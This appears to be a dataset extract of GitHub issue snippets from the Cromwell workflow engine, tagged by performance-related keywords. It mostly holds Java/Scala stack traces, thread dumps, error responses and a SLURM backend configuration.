Performance,".JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:81); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.De",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:1542,concurren,concurrent,1542,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['concurren'],['concurrent']
Performance,".Object.wait(Native Method); at java.lang.Object.wait(Object.java:502); at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157); - locked <0x00000006c00301d8> (a java.lang.ref.Reference$Lock). ""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.ready(package.scala:169); at cromwell.Main.cromwell$Main$$waitAndExit(Main.scala); at cromwell.Main$$anonfun$runServer$2.apply$mcI$sp(Main.scala:109); at cromwell.Main.continueIf(Main.scala); at cromwell.Main.runServer(Main.scala:109); at cromwell.Main.runAction(Main.scala:103); at cromwell.Main$.delayedEndpoint$cromwell$Main$1(Main.scala:49); at cromwell.Main$delayedInit$body.apply(Main.scala); at scala.Function0$class.apply$mcV$sp(Function0.scala); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.col",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:51005,concurren,concurrent,51005,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at soft,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7130,load,loadService,7130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loadService']
Performance,".actor.Props.newActor(Props.scala:212) ; at akka.actor.ActorCell.newActor(ActorCell.scala:624) ; at akka.actor.ActorCell.create(ActorCell.scala:650) ; ... 9 more ; ```. If I add in a `services` stanza, though, it asks me to define the class of each service, even though they should probably have default values:; ```; [ERROR] [01/24/2019 11:09:59.741] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Received ServiceRegistryMessage requ; esting service 'LoadController' for which no service is configured. Message: LoadMetric(NonEmptyList(CallCacheWriteActor),NormalLoad) ; [ERROR] [01/24/2019 11:09:59.731] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Received ServiceRegistryMessage requ; esting service 'Instrumentation' for which no service is configured. Message: InstrumentationServiceMessage(CromwellGauge(CromwellBucket(List(job),NonEmptyList(callcaching, read, $y, queue)),0)); ```. ***. Here's my config file for Cromwell 36 (that works):; ```; backend {; default = spartan. providers {; spartan {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? docker; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; module load Singularity/2.5.0-intel-2017.u2 || true; singularity pull docker://${docker}; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec -B ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}"" ; """""". kill = ""scancel ${job_id}""; check-alive =",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:3427,queue,queue,3427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,1,['queue'],['queue']
Performance,".aggregate_data.input_array\"":[\""bar, baz\""]}"",; ""workflow"": ""task aggregate_data {\n\tArray[File] input_array\n\n\tcommand {\n echo \""foo\""\n\n\t}\n\n\toutput {\n\t\tArray[Array[File]] output_array = [input_array]\n\t}\n\n\truntime {\n\t\tdocker : \""broadgdac/aggregate_data:31\""\n\t}\n\n\tmeta {\n\t\tauthor : \""Tim DeFreitas\""\n\t\temail : \""timdef@broadinstitute.org\""\n\t}\n\n}\n\nworkflow aggregate_data_workflow {\n\tcall aggregate_data\n}""; },; ""calls"": {; ""aggregate_data_workflow.aggregate_data"": [{; ""preemptible"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""gs://fc-5539c024-3ba8-4ed1-97c3-82fed2675776/1626e6be-60ed-48b1-9bbc-a3fdef4a90f5/aggregate_data_workflow/7be16669-0f81-4e19-96a0-dbe4b72cee8e/call-aggregate_data/aggregate_data-stdout.log"",; ""shardIndex"": -1,; ""outputs"": {. },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 10 SSD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""broadgdac/aggregate_data:31"",; ""cpu"": ""1"",; ""zones"": ""us-central1-b"",; ""memory"": ""2GB""; },; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""input_array"": [""bar, baz""]; },; ""failures"": [{; ""timestamp"": ""2016-08-01T19:58:04.704000Z"",; ""failure"": ""com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request\n{\n \""code\"" : 400,\n \""errors\"" : [ {\n \""domain\"" : \""global\"",\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""reason\"" : \""badRequest\""\n } ],\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""status\"" : \""INVALID_ARGUMENT\""\n}""; }],; ""backend"": ""JES"",; ""end"": ""2016-08-01T19:58:05.000000Z"",; ""stderr"": ""gs://fc-5539c024-3ba8-4ed1-97c3-82fed2675776/1626e6be-60ed-48b1-9bbc-a3fdef4a90f5/aggregate_data_workflow/7be16669-0f81-4e19-96a0-dbe4b72cee8e/call-aggregat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037:6974,cache,cache,6974,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037,1,['cache'],['cache']
Performance,".api.gax.rpc.UnavailableException: io.grpc.StatusRuntimeException: UNAVAILABLE: io exception; Channel Pipeline: [SslHandler#0, ProtocolNegotiators$ClientTlsHandler#0, WriteBufferingAndExceptionHandler#0, DefaultChannelPipeline$TailContext#0]; at com.google.api.gax.rpc.ApiExceptionFactory.createException(ApiExceptionFactory.java:112); at com.google.api.gax.rpc.ApiExceptionFactory.createException(ApiExceptionFactory.java:41); at com.google.api.gax.grpc.GrpcApiExceptionFactory.create(GrpcApiExceptionFactory.java:86); at com.google.api.gax.grpc.GrpcApiExceptionFactory.create(GrpcApiExceptionFactory.java:66); at com.google.api.gax.grpc.GrpcExceptionCallable$ExceptionTransformingFuture.onFailure(GrpcExceptionCallable.java:97); at com.google.api.core.ApiFutures$1.onFailure(ApiFutures.java:84); at com.google.common.util.concurrent.Futures$CallbackListener.run(Futures.java:1133); at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31); at com.google.common.util.concurrent.AbstractFuture.executeListener(AbstractFuture.java:1277); at com.google.common.util.concurrent.AbstractFuture.complete(AbstractFuture.java:1038); at com.google.common.util.concurrent.AbstractFuture.setException(AbstractFuture.java:808); at io.grpc.stub.ClientCalls$GrpcFuture.setException(ClientCalls.java:574); at io.grpc.stub.ClientCalls$UnaryStreamToFuture.onClose(ClientCalls.java:544); at io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39); at io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23); at io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40); at com.google.api.gax.grpc.ChannelPool$ReleasingClientCall$1.onClose(ChannelPool.java:541); at io.grpc.internal.ClientCallImpl.closeObserver(ClientCallImpl.java:576); at io.grpc.internal.ClientCallImpl.access$300(ClientCallImpl.java:70); at io.grpc.internal.ClientCallImpl$ClientStreamListenerI",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:1577,concurren,concurrent,1577,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['concurren'],['concurrent']
Performance,.apply(JesInitializationActor.scala:58); 	at scala.Option.foreach(Option.scala:257); 	at cromwell.backend.impl.jes.JesInitializationActor.cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile(JesInitializationActor.scala:58); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.scala:52); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.scala:51); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.impl.jes.JesInitializationActor.beforeAll(JesInitializationActor.scala:51); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(BackendWorkflowInitializationActor.scala:156); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(BackendWorkflowInitializationActor.scala:155); 	at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); 	at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339);,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1890:2042,concurren,concurrent,2042,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1890,1,['concurren'],['concurrent']
Performance,".atlassian.net/browse/BA-6172_. I'm trying to get call-caching working for my workflows, and having some trouble identifying a config that will work for the following requirements:. - Using containers (both Singularity and Docker); - Initial localisation strategy: `[hard-link, cached-copy]`; - Local SFS environment; - My input files can be fairly large (~250GB per Bam with up to 16 Bams). . If I can get this working, I'll happily document and update the CallCaching documentation page with what I've found. ## Background information. Version: Cromwell-47. Documentation:; - https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; - https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options; - https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem. Cache duplication strategies:; - `hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I sel",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:1197,cache,cached-copy,1197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,2,['cache'],"['cache', 'cached-copy']"
Performance,".await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""pool-1-thread-1"" #27 prio=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$tak",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:39817,concurren,concurrent,39817,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:111); at scala.util.Try$.apply(Try.scala:192); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:111); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:549); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterCo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:3364,concurren,concurrent,3364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['concurren'],['concurrent']
Performance,.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$B,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4585,concurren,concurrent,4585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91\; ); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.net.SocketException: Socket is closed; at sun.security.ssl.SSLSocketImpl.getInputStream(SSLSocketImpl.java:2218); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:642); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2009:2349,concurren,concurrent,2349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2009,1,['concurren'],['concurrent']
Performance,".concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-10"" #49 daemon prio=5 os_prio=31 tid=0x00007fb7720cd800 nid=0x8b03 waiting on condition [0x00000001316a4000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-9"" #48 daemon prio=5 os_prio=31 tid=0x00007fb76b529800 nid=0x8903 waiting on condition [0x00000001315a1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayB",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:28733,concurren,concurrent,28733,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
